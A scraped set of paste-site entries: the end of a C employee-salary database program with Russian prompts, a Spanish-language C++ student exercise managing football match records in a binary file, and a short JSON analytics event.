	{
		fscanf(base, ""%s %s %d "", &curr.departName, &curr.lastName, &curr.salary);
		if (strcmp(curr.departName, department) == 0)
		{
			workerCount++;
			allSalary += curr.salary;
		}
	} while (feof(base) == 0);
	if (workerCount > 0)
	{
		averageSalary = allSalary / workerCount;
	}

	fclose(base);
	printf(""Общие выплаты по отделу %s: %d\n"", department, allSalary);
	printf(""Среднемесячная зарплата сотрудника отдела: %g\n"", averageSalary);
}

void output()
{
	struct person curr;
	FILE* base = fopen(fileName, ""r"");
	do
	{
		fscanf(base, ""%s %s %d "", &curr.departName, &curr.lastName, &curr.salary);
		printf(""Отдел: %s\t Фамилия: %s\t Зарплата: %d\n"", curr.departName, curr.lastName, curr.salary);
	} while (feof(base) == 0);
	fclose(base);
}

int main()
{
	SetConsoleOutputCP(1251);
	SetConsoleCP(1251);

	struct person temp;
	int choice = -1;
	while (choice != 0)
	{
		printf(""Вывести все записи о сотрудниках? (1 - да, 0 - нет): "");
		scanf(""%d"", &choice);
		if (choice == 1)
		{
			output();
		}
		printf(""Желаете найти общую сумму выплат за месяц, а также среднемесячную зарплату? (1 - да, 0 - нет): "");
		scanf(""%d"", &choice);
		if (choice == 1)
		{
			task();
		}
		printf(""Желаете добавить ещё одного сотрудника? (1 - да, 0 - нет): "");
		scanf(""%d"", &choice);
		if (choice == 1)
		{
			inputNewPerson();
		}
		char lastName[50];
		printf(""Желаете удалить какого-либо сотрудника из базы данных? (1 - да, 0 - нет): "");
		scanf(""%d"", &choice);
		if (choice == 1)
		{
			printf(""Введите фамилию сотрудника, которого желаете исключить: "");
			scanf(""%s"", &lastName);
			editPerson(lastName, 1);
		}
		printf(""Желаете отредактировать данные о каком-либо сотруднике? (1 - да, 0 - нет) : "");
		scanf(""%d"", &choice);
		if (choice == 1)
		{
			printf(""Введите фамилию сотрудника, данные о котором необходимо отредактировать: "");
			scanf(""%s"", &lastName);
			editPerson(lastName, 0);
		}
		printf(""Желаете повторить какие-либо действия? (1 - да, 0 - нет): "");
		scanf(""%d"", &choice);
	}
	return 0;
}"
kjDPPyP6,Untitled,emacuervo,C++,Monday 4th of December 2023 03:44:57 PM CDT,"#include <iostream>
#include <clocale>
#include <cstring>
using namespace std;

void cargarCadena(char *palabra, int tam){
    int i=0;
    fflush(stdin);
    for (i=0; i<tam; i++){
        palabra[i]=cin.get();
        if (palabra[i]=='\n'){
            break;
        }
    }
    palabra[i]='\0';
    fflush(stdin);
}

class Fecha{
private:
    int dia,mes, anio;
public:
    void Cargar(){
        cin>>dia;
        cin>>mes;
        cin>>anio;
    }
    void Mostrar(){
        cout<<dia<<""/"";
        cout<<mes<<""/"";
        cout<<anio<<endl;
    }
    int getDia(){return dia;}
    int getMes(){return mes;}
    int getAnio(){return anio;}

    void setDia(int d){dia=d;}
    void setMes(int m){mes=m;}
    void setAnio(int a){anio=a;}

};

class Partidos{
    private:
        int codPartido;
        int sede;
        int codLocal;
        int codVisitante;
        Fecha fechaRealizacion;
        char nombreArbitro[50];
        bool estado;

    public:
        Partidos(int codPart = 0){
            codPartido = codPart;
        }

        int getCodPartido(){return codPartido;}
        int getSede(){return sede;}
        int getCodLocal(){return codLocal;}
        int getCodVisitante(){return codVisitante;}
        Fecha getFechaRealizacion(){return fechaRealizacion;}
        const char* getNombreArbitro(){return nombreArbitro;}
        bool getEstado(){return estado;}

        void setCodPartido(int cp){codPartido = cp;}
        void setSede(int s){sede = s;}
        void setCodLocal(int cl){codLocal = cl;}
        void setCodVisitante(int cv){codVisitante = cv;}
        void setFechaRealizacion(Fecha f){fechaRealizacion = f;}
        void setNombreArbitro(const char* na){strcpy(nombreArbitro, na);}
        void setEstado(bool e){estado = e;}

        bool Cargar(){
            cout<< ""CODIGO PARTIDO: "";
            cin>> codPartido;
            cout<< ""SEDE: "";
            cin>> sede;
            cout<< ""CODIGO EQUIPO LOCAL: "";
            cin>> codLocal;
            cout<< ""CODIGO EQUIPO VISITANTE: "";
            cin>> codVisitante;
            cout<< ""FECHA DE REALIZACION: "";
            fechaRealizacion.Cargar();
            cout<< ""NOMBRE DEL ARBITRO: "";
            cin>> nombreArbitro;
            estado = true;

            return true;
        }

        void Mostrar(){
            cout<< codPartido << endl;
            cout<< sede << endl;
            cout<< codLocal << endl;
            cout<< codVisitante << endl;
            fechaRealizacion.Mostrar();
            cout<< nombreArbitro << endl;
            cout<< estado << endl;
        }
};


class ArchivoPartido{
    private:
        char nombre[30];
    public:
        ArchivoPartido(const char *n){
            strcpy(nombre, n);
        }
        bool grabarRegistro(Partidos reg){
            FILE * archivo = fopen(nombre, ""ab"");
            if (archivo == NULL){
                return false;
            }
            Partidos registro;
            bool exito = registro.Cargar();
            if (exito){
                fwrite(&registro, sizeof registro, 1, archivo);
                cout << ""REGISTRO ESCRITO CON EXITO""<<endl;
            }
            fclose(archivo);
            return true;
        }
        bool mostrarRegistros(){
            FILE * archivo = fopen(nombre, ""rb"");
            if (archivo == NULL)
            {
                cout << ""ERROR ABRIENDO EL ARCHIVO en MOSTRAR\n"";
                return false;
            }
            Partidos leer;
            while(fread(&leer, sizeof leer, 1, archivo)==1)
            {
                if (leer.getEstado()) leer.Mostrar();
            }
            fclose(archivo);
            return true;
        }

        int buscarCodigo (int codigo) {
            FILE * archivo = fopen(nombre, ""rb"");
            if (archivo == NULL) {
                cout << ""ERROR ABRIENDO EL ARCHIVO BUSCAR JUGADOR \n"";
                return -1;
            }
            Partidos leer;
            int pos = 0;
            while (fread(&leer, sizeof leer, 1, archivo)) {
                if (leer.getCodPartido() == codigo && leer.getEstado()) {
                    leer.Mostrar();
                    fclose(archivo);
                    return pos;
                }
                pos++;
            }
            cout << ""NO SE ENCONTRO EL EQUIPO CON EL CODIGO INGRESADO \n"";
            fclose(archivo);
            return -2;
        }
        bool bajaLogica() {
            int codigo;
            cout << ""INGRESAR CODIGO DEL EQUIPO: "";
            cin >> codigo;
            int pos = buscarCodigo(codigo);
            if (pos > -1) {
                FILE * archivo = fopen(nombre, ""r+b"");
                if (archivo == NULL) {
                    cout << ""ERROR ABRIENDO EL ARCHIVO \n"";
                    return false;
                }
                Partidos leer;
                fseek(archivo, sizeof leer * pos, SEEK_SET);
                fread(&leer, sizeof leer, 1, archivo);

                leer.setEstado(false);
                fseek(archivo, sizeof leer * pos, SEEK_SET);
                if (fwrite(&leer, sizeof leer, 1, archivo)) {
                    fclose(archivo);
                    cout << ""REGISTRO ELIMINADO CON EXITO \n"";
                    return true;
                }
                fclose(archivo);
                cout << ""ERROR DE ARCHIVO, INTENTA DE NUEVO\n"";
                return false;
            }
            return false;
        }

        Partidos leerRegistro(int pos){
            Partidos reg;
            reg.setCodLocal(-1);
            FILE *p;
            p=fopen(nombre, ""rb"");
            if(p==NULL) return reg;
            fseek(p, sizeof(Partidos)*pos,0);
            fread(&reg, sizeof reg,1, p);
            fclose(p);
            return reg;
        }
        int contarRegistros(){
            FILE *p;
            p=fopen(nombre, ""rb"");
            if(p==NULL) return -1;
            fseek(p, 0,2);
            int tam=ftell(p);
            fclose(p);
            return tam/sizeof(Partidos);
        }
};

void punto3(){
    ArchivoPartido archPart(""Partidos.dat"");
    int cantPart = archPart.contarRegistros();
    Partidos regPart;

    Partidos *v;

    if (cantPart <= 0){
        cout<< ""No hay registros"" << endl;
        return;
    }

    v=new Partidos[cantPart];
    if(v==NULL) return;

    int pos=0;

    for (int x=0; x<cantPart; x++){
        regPart = archPart.leerRegistro(x);
        v[pos] = regPart;
        pos++;
    }

    for (int x=0; x<cantPart; x++){
        v[x].Mostrar();
    }

    delete[] v;
}



int main (void){
	int opc;

    ArchivoPartido archPartidos(""Partidos.dat"");

    while(true){
        //system(""cls"");
        cout<<""MENU ALUMNOS ""<<endl;
        cout<<""********************** ""<<endl;
        cout<<""1. AGREGAR REGISTRO ""<<endl;
        cout<<""2. BAJA LOGICA ""<< endl;
        cout<<""3. MOSTRAR REGISTROS ""<<endl;
        cout<<""0. SALIR DEL PROGRAMA ""<<endl;
        cout<<""********************** ""<<endl;
        cout<<""OPCION ""<<endl;
        cin>>opc;
        system(""cls"");
        switch(opc){
            case 1:
                archPartidos.grabarRegistro(opc);
                break;

            case 2:
                archPartidos.bajaLogica();
                break;
            case 3:
                archPartidos.mostrarRegistros();
                break;
            case 0:
                return 0;
                break;

        }
        system(""pause"");
        system(""cls"");
    }


  return 0;
}"
Etc6WdMd,Untitled,dertarchingratadata,JSON,Monday 4th of December 2023 03:42:50 PM CDT,"{
    ""popup"": ""List Explorer"",
    ""action"": ""Open"",
    ""source"": ""CTA: Add Lists""
}"
